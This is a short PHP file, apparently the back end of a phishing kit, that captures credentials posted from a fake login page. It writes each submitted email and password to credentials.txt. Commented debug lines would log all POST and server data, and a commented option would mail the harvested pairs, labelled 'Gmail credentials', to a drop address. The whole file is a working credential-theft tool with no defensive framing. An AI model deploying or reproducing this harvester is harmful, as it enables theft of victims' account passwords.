<?php
// DEBUG
// $file = fopen("credentials.txt", "a");
// fwrite($file, json_encode($_POST) . PHP_EOL);
// fwrite($file, json_decode(file_get_contents('php://input'), true)['email']);
// fwrite($file, json_encode($_SERVER) . PHP_EOL);
// fwrite($file, $_POST['email'] . PHP_EOL);
// fclose($file);

$file = fopen("credentials.txt", "a");
$data = json_decode(file_get_contents('php://input'), true);
fwrite($file, $data['email'] . "\t" . $data['password'] . PHP_EOL);
fclose($file);

// uncomment the lines below to receive the credentials by email
// $maildrop = "sample@email.com";
// mail($maildrop, "Gmail credentials", $_POST['email'] . "\t" . $_POST['pass']);
